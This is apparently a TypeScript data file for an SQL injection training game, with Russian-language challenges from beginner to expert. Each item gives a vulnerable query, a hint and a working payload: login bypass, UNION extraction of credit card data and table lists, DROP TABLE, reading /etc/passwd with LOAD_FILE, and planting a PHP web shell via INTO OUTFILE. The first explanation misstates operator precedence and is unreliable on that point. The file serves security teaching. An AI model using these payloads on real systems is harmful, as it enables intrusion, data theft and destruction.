// SQL Injection Challenges

export interface SQLChallenge {
  id: string;
  level: string;
  title: string;
  description: string;
  initialQuery: string;
  hint: string;
  exampleInput: string;
  explanation: string;
  successQuery: string;
}

export const sqlChallenges: SQLChallenge[] = [
  {
    id: 'beginner-1',
    level: 'Новичок',
    title: 'Обход аутентификации',
    description: 'Войдите в систему без знания реального пароля, используя SQL-инъекцию в форме логина.',
    initialQuery: `SELECT * FROM users
WHERE username = '[ВВОД]'
  AND password = 'password123'`,
    hint: 'Попробуйте закрыть строку с помощью одинарной кавычки и добавить условие, которое всегда истинно.',
    exampleInput: "' OR '1'='1",
    explanation:
      'Ввод \' OR \'1\'=\'1 закрывает строку username и добавляет условие OR \'1\'=\'1\', которое всегда истинно. Это превращает запрос в: SELECT * FROM users WHERE username=\'\' OR \'1\'=\'1\' AND password=\'password123\'. Благодаря приоритету оператора AND, условие OR \'1\'=\'1\' оценивается первым, возвращая все строки.',
    successQuery: `SELECT * FROM users
WHERE username = '' OR '1'='1'
  AND password = 'password123'`,
  },
  {
    id: 'beginner-2',
    level: 'Новичок',
    title: 'Комментарий для обхода',
    description: 'Обойдите проверку пароля, используя SQL-комментарий для игнорирования оставшейся части запроса.',
    initialQuery: `SELECT * FROM users
WHERE username = '[ВВОД]'
  AND password = 'any'`,
    hint: 'Используйте символы -- (двойной дефис) для комментирования части запроса с паролем.',
    exampleInput: "admin'--",
    explanation:
      'Ввод admin\\\'-- закрывает строку username, а -- превращает всё после в комментарий. Запрос становится: SELECT * FROM users WHERE username=\\\'admin\\\'-- AND password=\\\'any\\\'. Часть с паролем полностью игнорируется, и запрос возвращает данные пользователя admin.',
    successQuery: `SELECT * FROM users
WHERE username = 'admin'--
  AND password = 'any'`,
  },
  {
    id: 'beginner-3',
    level: 'Новичок',
    title: 'Угадывание существования пользователя',
    description: 'Определите, существует ли пользователь в базе данных, используя слепую SQL-инъекцию с условным ответом.',
    initialQuery: `SELECT * FROM users
WHERE username = '[ВВОД]'`,
    hint: 'Используйте оператор AND с функцией, которая всегда возвращает истину для существующего пользователя.',
    exampleInput: "admin' AND '1'='1",
    explanation:
      'Если пользователь admin существует, запрос вернёт результат, и вы увидите его данные. Если не существует — результат будет пустым. Это позволяет проверять наличие пользователей методом подбора.',
    successQuery: `SELECT * FROM users
WHERE username = 'admin' AND '1'='1'`,
  },
  {
    id: 'intermediate-1',
    level: 'Средний',
    title: 'Извлечение количества столбцов',
    description: 'Определите количество столбцов в исходном запросе, используя ORDER BY.',
    initialQuery: `SELECT name, email, role FROM users
WHERE id = [ВВОД]`,
    hint: 'Используйте ORDER BY с возрастающими номерами столбцов. Ошибка возникнет когда номер превысит реальное количество.',
    exampleInput: "1 ORDER BY 4",
    explanation:
      'ORDER BY 4 попытается отсортировать по 4-му столбцу, но их всего 3. Это вызовет ошибку. ORDER BY 3 сработает без ошибок. Таким образом можно определить количество столбцов перед UNION-атакой.',
    successQuery: `SELECT name, email, role FROM users
WHERE id = 1 ORDER BY 3`,
  },
  {
    id: 'intermediate-2',
    level: 'Средний',
    title: 'Извлечение версий СУБД',
    description: 'Извлеките информацию о версии используемой СУБД через UNION-инъекцию.',
    initialQuery: `SELECT name, email FROM users
WHERE id = [ВВОД]`,
    hint: 'Используйте UNION SELECT для извлечения системных данных. MySQL использует @@version, PostgreSQL — version().',
    exampleInput: "-1 UNION SELECT 'MySQL', version()--",
    explanation:
      '-1 гарантирует что оригинальный запрос не вернёт данных. UNION SELECT подменяет результат. version() вернёт версию MySQL (например, 8.0.32). Это полезно для подбора дальнейших атак специфичных для версии.',
    successQuery: `SELECT name, email FROM users
WHERE id = -1 UNION SELECT 'MySQL', version()--`,
  },
  {
    id: 'advanced-1',
    level: 'Продвинутый',
    title: 'Извлечение данных через UNION',
    description: 'Используйте UNION SELECT для извлечения данных из таблицы credit_cards.',
    initialQuery: `SELECT name, email FROM users
WHERE name LIKE '%[ВВОД]%'`,
    hint: 'Закройте LIKE-выражение и добавьте UNION SELECT для выборки из другой таблицы. Количество столбцов должно совпадать.',
    exampleInput: "' UNION SELECT card_number, cvv FROM credit_cards--",
    explanation:
      'UNION объединяет результаты двух SELECT-запросов. Количество столбцов должно быть одинаковым. Комментарий -- скрывает остаток оригинального запроса. Результат: SELECT name, email FROM users WHERE name LIKE \\\'\\\' UNION SELECT card_number, cvv FROM credit_cards--%. Это возвращает данные о кредитных картах вместе с обычными результатами.',
    successQuery: `SELECT name, email FROM users
WHERE name LIKE '%' UNION SELECT card_number, cvv FROM credit_cards--%'`,
  },
  {
    id: 'advanced-2',
    level: 'Продвинутый',
    title: 'Извлечение всех таблиц',
    description: 'Извлеките список всех таблиц из базы данных через системные схемы.',
    initialQuery: `SELECT product_name, price FROM products
WHERE category = '[ВВОД]'`,
    hint: 'Используйте INFORMATION_SCHEMA.TABLES для получения списка таблиц (MySQL) или pg_tables (PostgreSQL).',
    exampleInput: "' UNION SELECT table_name, NULL FROM INFORMATION_SCHEMA.TABLES--",
    explanation:
      'INFORMATION_SCHEMA.TABLES содержит метаданные о всех таблицах в БД. UNION SELECT позволяет извлечь эти данные. NULL используется чтобы заполнить второй столбец (price), так как мы не извлекаем из него данные.',
    successQuery: `SELECT product_name, price FROM products
WHERE category = '' UNION SELECT table_name, NULL FROM INFORMATION_SCHEMA.TABLES--'`,
  },
  {
    id: 'expert-1',
    level: 'Эксперт',
    title: 'Уничтожение данных (DROP TABLE)',
    description: 'Используйте инъекцию для выполнения деструктивной операции — удалите таблицу.',
    initialQuery: `SELECT * FROM products
WHERE id = [ВВОД]`,
    hint: 'Закройте числовое значение и добавьте точку с запятой для нового SQL-оператора.',
    exampleInput: "1; DROP TABLE products;--",
    explanation:
      'Точка с запятой позволяет выполнить несколько SQL-операторов в одном запросе. Ввод 1; DROP TABLE products;-- сначала выполняет SELECT, а затем DROP TABLE. Этот тип атаки особенно опасен, так как приводит к полной потере данных. Многие СУБД предотвращают множественные запросы, но не все.',
    successQuery: `SELECT * FROM products
WHERE id = 1; DROP TABLE products;--`,
  },
  {
    id: 'expert-2',
    level: 'Эксперт',
    title: 'Чтение файлов с сервера',
    description: 'Используйте LOAD_FILE() для чтения чувствительных файлов с серверной файловой системы.',
    initialQuery: `SELECT * FROM articles
WHERE id = [ВВОД]`,
    hint: 'MySQL функция LOAD_FILE() может читать файлы при наличии прав FILE привилегий.',
    exampleInput: "1 UNION SELECT NULL, LOAD_FILE('/etc/passwd')--",
    explanation:
      'LOAD_FILE() — функция MySQL для чтения файлов с сервера. Требуются права FILE на чтение. Часто используется для чтения конфигурационных файлов, /etc/passwd, или исходного кода. В Windows путь должен быть в формате C:\\\\path\\\\to\\\\file.',
    successQuery: `SELECT * FROM articles
WHERE id = 1 UNION SELECT NULL, LOAD_FILE('/etc/passwd')--`,
  },
  {
    id: 'expert-3',
    level: 'Эксперт',
    title: 'Выполнение команд ОС',
    description: 'Используйте SQL-инъекцию для выполнения произвольных команд на сервере.',
    initialQuery: `SELECT * FROM logs
WHERE user_id = [ВВОД]`,
    hint: 'В MySQL можно использовать INTO OUTFILE для создания файлов, включая PHP-шеллы.',
    exampleInput: "1 UNION SELECT '<?php system($_GET[cmd]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php'--",
    explanation:
      'INTO OUTFILE записывает результат SELECT в файл на сервере. Создав PHP-файл с функцией system(), можно получить удалённое выполнение кода. Требуются права FILE и правильное расположение веб-сервера. Это один из самых опасных типов SQL-инъекций.',
    successQuery: `SELECT * FROM logs
WHERE user_id = 1 UNION SELECT '<?php system($_GET[cmd]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php'--`,
  },
];